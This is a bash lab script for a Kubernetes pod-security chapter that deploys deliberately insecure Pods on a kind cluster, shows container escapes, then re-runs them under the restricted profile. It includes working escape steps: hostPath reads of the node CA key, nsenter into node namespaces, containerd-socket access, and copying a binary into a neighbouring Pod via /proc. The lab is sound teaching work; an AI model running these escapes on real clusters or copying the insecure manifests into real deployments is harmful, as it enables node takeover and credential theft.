#!/usr/bin/env bash
# Lab for 05-security/02-pod-security.md: attack, harden, re-attack.
#
# Tier A: kind on a Linux host. Run it only against a kind cluster you own.
# The script refuses any kubectl context that is not kind-*, and it refuses to
# start while one of its namespaces is left over. It creates five namespaces
# prefixed p05-02-, and deletes them at the end. It applies the Bookstore's
# PriorityClasses, which are cluster-scoped: on a cluster that already has
# them, the apply can reconfigure them to match the file, and the script
# leaves them in place.
#
# Run from the repository root:
#   KUBECONFIG=... bash full-guide/examples/security-lab/labs/05-02.sh \
#     > full-guide/examples/security-lab/evidence/05-02.txt
#
# Each command is printed the way a reader types it, then run, so the output
# under it is what that command printed. The cluster name is shown as `lab`.

set -uo pipefail

GUIDE=$(cd "$(dirname "$0")/../../.." && pwd)
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

CONTEXT=$(kubectl config current-context 2>/dev/null)
case "$CONTEXT" in
  kind-*) ;;
  *) echo "refusing: kubectl context '$CONTEXT' is not a kind cluster" >&2; exit 2 ;;
esac
CLUSTER=${CONTEXT#kind-}

NAMESPACES="p05-02-attack p05-02-baseline p05-02-restricted p05-02-bookstore p05-02-unlabelled"
for ns in $NAMESPACES; do
  if kubectl get namespace "$ns" >/dev/null 2>&1; then
    echo "refusing: namespace $ns exists; delete the old lab first" >&2
    exit 2
  fi
done

redact() { sed -e "s/${CLUSTER}/lab/g"; }

show() {
  printf '$ %s\n' "$(printf '%s\n' "$1" | redact)"
  eval "$1" 2>&1 | redact
}

# copy_cmd DST prints the command that copies busybox from escape-node into
# the root of the Pod that runs `sleep 1800`. The copy must find exactly one
# such process, so the lab stops if two Pods run it at once.
copy_cmd() {
cat <<'CMD' | sed -e "s|@DST@|$1|g"
kubectl exec -n p05-02-attack escape-node -- sh -c '
VPID=$(ps -o pid,args | awk "\$2==\"sleep\" && \$3==\"1800\" {print \$1}")
set -- $VPID
[ $# = 1 ] || { echo "victim not unique: $VPID"; exit 1; }
echo "victim pid $VPID"
cp /bin/busybox /proc/$VPID/root@DST@ && echo "copied to @DST@"'
CMD
}

# hostpath_read POD prints the reads a reader makes through a hostPath mount
# of the node root. It prints the first ten bytes of the CA key only.
hostpath_read() {
cat <<'CMD' | sed -e "s/@POD@/$1/g"
kubectl exec -n p05-02-attack @POD@ -- sh -c '
id -u
grep ^CapEff /proc/self/status | tr -s "\t" " "
cat /host/etc/hostname
stat -c "%a %U %n" /host/etc/kubernetes/pki/ca.key
head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
CMD
}

cmd_hostpid_read() {
cat <<'CMD'
kubectl exec -n p05-02-attack escape-hostpid -- sh -c '
K=$(pidof kubelet)
kill -0 "$K" && echo "kill -0 kubelet: allowed"
tr "\0" " " < "/proc/$K/cmdline" | cut -c1-40'
CMD
}

cmd_socket() {
cat <<'CMD'
kubectl exec -n p05-02-attack escape-socket -- sh -c '
R=unix:///run/containerd/containerd.sock
echo "containers visible: $(crictl -r $R ps -q 2>/dev/null | wc -l)"
crictl -r $R ps --name kube-apiserver -o table 2>/dev/null |
  grep -o "kube-apiserver-[a-z0-9-]*"'
CMD
}

cmd_bookstore_loop() {
cat <<'CMD'
for f in $(grep -lE '^kind: (Pod|Deployment|StatefulSet|DaemonSet|Job|CronJob)( |$)' examples/bookstore/raw-manifests/*.yaml); do
  sed 's/namespace: bookstore/namespace: p05-02-bookstore/' "$f" |
    kubectl apply -n p05-02-bookstore --dry-run=server -f -
done
CMD
}

NODE_VERSION=$(kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.kubeletVersion}' 2>/dev/null)
printf '%s\n' \
  "# Transcript for 05-security/02-pod-security.md." \
  "# Tier A: kind on a Linux host, node $NODE_VERSION." \
  "# Recorded by running labs/05-02.sh against a kind cluster the lab owns." \
  "# The cluster name is shown as \`lab\`."

cd "$WORK" || exit 2

echo "## versions and the node"
show "kubectl version"
show "kubectl get nodes -o custom-columns=NAME:.metadata.name,KUBELET:.status.nodeInfo.kubeletVersion,KERNEL:.status.nodeInfo.kernelVersion,RUNTIME:.status.nodeInfo.containerRuntimeVersion,OS:.status.nodeInfo.osImage"

echo "## namespaces"
show "kubectl create namespace p05-02-attack"
show "kubectl label namespace p05-02-attack pod-security.kubernetes.io/enforce=privileged"
show "kubectl create namespace p05-02-baseline"
show "kubectl label namespace p05-02-baseline pod-security.kubernetes.io/enforce=baseline pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
show "kubectl create namespace p05-02-restricted"
show "kubectl label namespace p05-02-restricted pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/audit=restricted pod-security.kubernetes.io/audit-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
show "kubectl create namespace p05-02-bookstore"
show "kubectl label namespace p05-02-bookstore pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/audit=restricted pod-security.kubernetes.io/audit-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
show "kubectl create namespace p05-02-unlabelled"
show "for ns in p05-02-attack p05-02-baseline p05-02-restricted p05-02-bookstore p05-02-unlabelled; do for i in \$(seq 60); do kubectl -n \$ns get serviceaccount default >/dev/null 2>&1 && break; sleep 1; done; echo \"default serviceaccount in \$ns\"; done"

echo "## audit: the API server's command line"
show "kubectl -n kube-system get pod -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\n' | grep -c audit"

echo "## a default Pod, and privileged without a host namespace"
cat > victim.yaml <<'YAML'
# INSECURE ON PURPOSE: a default Pod, root with a writable root filesystem and no securityContext. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: victim
  namespace: p05-02-attack
spec:
  containers:
    - name: app
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "1800"]
YAML
show "kubectl apply -f victim.yaml"
show "kubectl wait --for=condition=Ready pod/victim -n p05-02-attack --timeout=120s"
cat > escape-privileged.yaml <<'YAML'
# INSECURE ON PURPOSE: a privileged container with no host namespace. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-privileged
  namespace: p05-02-attack
spec:
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
YAML
show "kubectl apply -f escape-privileged.yaml"
show "kubectl wait --for=condition=Ready pod/escape-privileged -n p05-02-attack --timeout=120s"
show "kubectl exec -n p05-02-attack escape-privileged -- awk '/^Cap(Eff|Bnd)/ {print \$1, \$2}' /proc/self/status"
show "kubectl exec -n p05-02-attack escape-privileged -- sh -c 'ps -o pid,args | head -5'"
show "kubectl exec -n p05-02-attack escape-privileged -- sh -c 'echo devices in privileged: \$(ls /dev | wc -l)'"
show "kubectl exec -n p05-02-attack victim -- sh -c 'echo devices in default: \$(ls /dev | wc -l)'"

echo "## hostPID without privilege"
cat > escape-hostpid.yaml <<'YAML'
# INSECURE ON PURPOSE: hostPID shares the node's process table with the Pod. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpid
  namespace: p05-02-attack
spec:
  hostPID: true
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
YAML
show "kubectl apply -f escape-hostpid.yaml"
show "kubectl wait --for=condition=Ready pod/escape-hostpid -n p05-02-attack --timeout=120s"
show "kubectl exec -n p05-02-attack escape-hostpid -- sh -c 'ps -o pid,comm' | grep -E '^ *[0-9]+ (kubelet|containerd)$' | sed 's/^ *//'"
show "$(cmd_hostpid_read)"
show "kubectl exec -n p05-02-attack escape-hostpid -- nsenter -t 1 -m -- cat /etc/hostname"

echo "## hostPath: the node root, and a read of the CA key"
cat > escape-hostpath.yaml <<'YAML'
# INSECURE ON PURPOSE: a hostPath mount of the node root, read as root with no capabilities. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpath
  namespace: p05-02-attack
spec:
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          drop: ["ALL"]
      volumeMounts:
        - name: nodefs
          mountPath: /host
          readOnly: true
  volumes:
    - name: nodefs
      hostPath:
        path: /
        type: Directory
YAML
show "kubectl apply -f escape-hostpath.yaml"
show "kubectl wait --for=condition=Ready pod/escape-hostpath -n p05-02-attack --timeout=120s"
show "$(hostpath_read escape-hostpath)"
cat > escape-hostpath-nonroot.yaml <<'YAML'
# INSECURE ON PURPOSE: the same hostPath mount, run as UID 65532 with no capabilities. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpath-nonroot
  namespace: p05-02-attack
spec:
  securityContext:
    runAsUser: 65532
    runAsGroup: 65532
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          drop: ["ALL"]
      volumeMounts:
        - name: nodefs
          mountPath: /host
          readOnly: true
  volumes:
    - name: nodefs
      hostPath:
        path: /
        type: Directory
YAML
show "kubectl apply -f escape-hostpath-nonroot.yaml"
show "kubectl wait --for=condition=Ready pod/escape-hostpath-nonroot -n p05-02-attack --timeout=120s"
show "$(hostpath_read escape-hostpath-nonroot)"

echo "## runtime socket"
cat > escape-socket.yaml <<'YAML'
# INSECURE ON PURPOSE: the containerd socket and crictl mounted into the Pod. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-socket
  namespace: p05-02-attack
spec:
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
      volumeMounts:
        - name: containerd
          mountPath: /run/containerd/containerd.sock
        - name: crictl
          mountPath: /usr/local/bin/crictl
          readOnly: true
  volumes:
    - name: containerd
      hostPath:
        path: /run/containerd/containerd.sock
        type: Socket
    - name: crictl
      hostPath:
        path: /usr/local/bin/crictl
        type: File
YAML
show "kubectl apply -f escape-socket.yaml"
show "kubectl wait --for=condition=Ready pod/escape-socket -n p05-02-attack --timeout=120s"
show "$(cmd_socket)"

echo "## privileged with hostPID: the node's namespaces, and a write into a neighbour"
cat > escape-node.yaml <<'YAML'
# INSECURE ON PURPOSE: privileged with hostPID, so nsenter can enter the node's namespaces. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: escape-node
  namespace: p05-02-attack
spec:
  hostPID: true
  containers:
    - name: esc
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
YAML
show "kubectl apply -f escape-node.yaml"
show "kubectl wait --for=condition=Ready pod/escape-node -n p05-02-attack --timeout=120s"
show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- cat /etc/hostname"
show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- ls -l /etc/kubernetes/super-admin.conf"
show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- runc --version | head -1"
show "$(copy_cmd /tmp/busybox)"
show "kubectl exec -n p05-02-attack victim -- /tmp/busybox id"

echo "## the same attacks under restricted"
for f in escape-privileged escape-hostpid escape-hostpath escape-socket escape-node; do
  show "sed 's/namespace: p05-02-attack/namespace: p05-02-restricted/' $f.yaml | kubectl apply --dry-run=server -f -"
done

echo "## the hardened victim in restricted, and the same neighbour"
show "kubectl delete pod victim -n p05-02-attack --wait=true"
cat > victim-hardened.yaml <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: victim-sa
  namespace: p05-02-restricted
automountServiceAccountToken: false
---
apiVersion: v1
kind: Pod
metadata:
  name: victim
  namespace: p05-02-restricted
spec:
  serviceAccountName: victim-sa
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    runAsGroup: 65532
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "1800"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          memory: 32Mi
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
YAML
show "kubectl apply -f victim-hardened.yaml"
show "kubectl wait --for=condition=Ready pod/victim -n p05-02-restricted --timeout=120s"
show "kubectl exec -n p05-02-restricted victim -- sh -c 'cp /bin/busybox /usr/bin/implant'"
show "kubectl exec -n p05-02-restricted victim -- sh -c 'cp /bin/busybox /tmp/busybox && /tmp/busybox id'"
show "kubectl exec -n p05-02-restricted victim -- awk '/^(CapEff|NoNewPrivs|Seccomp):/ {print \$1, \$2}' /proc/self/status"
show "$(copy_cmd /usr/bin/implant)"
show "$(copy_cmd /tmp/id)"
show "kubectl exec -n p05-02-restricted victim -- /tmp/id"

echo "## user namespaces"
show "kubectl exec -n p05-02-restricted victim -- cat /proc/self/uid_map | awk '{\$1=\$1;print}'"
cat > userns-probe.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: userns-probe
  namespace: p05-02-restricted
spec:
  hostUsers: false
  serviceAccountName: victim-sa
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    runAsGroup: 65532
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "1800"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          memory: 32Mi
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
YAML
show "kubectl apply -f userns-probe.yaml"
show "kubectl wait --for=condition=Ready pod/userns-probe -n p05-02-restricted --timeout=60s"
show "kubectl get events -n p05-02-restricted --field-selector involvedObject.name=userns-probe --sort-by=.lastTimestamp | tail -2"

echo "## baseline and restricted, one namespace each"
cat > victim-baseline.yaml <<'YAML'
# INSECURE ON PURPOSE: a default Pod in a baseline namespace, which restricted only warns about. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: victim
  namespace: p05-02-baseline
spec:
  containers:
    - name: app
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sleep", "3600"]
YAML
show "kubectl apply -f victim-baseline.yaml"
show "kubectl wait --for=condition=Ready pod/victim -n p05-02-baseline --timeout=120s"
show "sed 's/namespace: p05-02-attack/namespace: p05-02-baseline/' escape-hostpid.yaml | kubectl apply --dry-run=server -f -"
show "sed 's/namespace: p05-02-attack/namespace: p05-02-baseline/' escape-hostpath.yaml | kubectl apply --dry-run=server -f -"

echo "## the Bookstore under restricted"
show "kubectl create deployment unhardened --image=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 --dry-run=server -n p05-02-bookstore -- sleep 3600"
show "kubectl create deployment unhardened --image=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 --dry-run=server -n p05-02-unlabelled -- sleep 3600"
( cd "$GUIDE" && show "sed 's/namespace: bookstore/namespace: p05-02-bookstore/' examples/bookstore/raw-manifests/05-serviceaccounts-rbac.yaml | kubectl apply -f -" )
( cd "$GUIDE" && show "$(cmd_bookstore_loop)" )
for f in 16-db-credentials 35-priorityclasses 12-redis 13-rabbitmq 20-postgres-statefulset; do
  ( cd "$GUIDE" && show "sed 's/namespace: bookstore/namespace: p05-02-bookstore/' examples/bookstore/raw-manifests/$f.yaml | kubectl apply -f -" )
done
show "kubectl rollout status -n p05-02-bookstore deployment/redis --timeout=180s"
show "kubectl rollout status -n p05-02-bookstore deployment/rabbitmq --timeout=300s"
show "kubectl rollout status -n p05-02-bookstore statefulset/postgres --timeout=180s"
for w in deployment/redis deployment/rabbitmq statefulset/postgres; do
  show "kubectl exec -n p05-02-bookstore $w -- sh -c 'id; touch /usr/bin/backdoor || true'"
done

echo "## cleanup"
show "kubectl delete namespace $NAMESPACES --wait=true --timeout=300s"
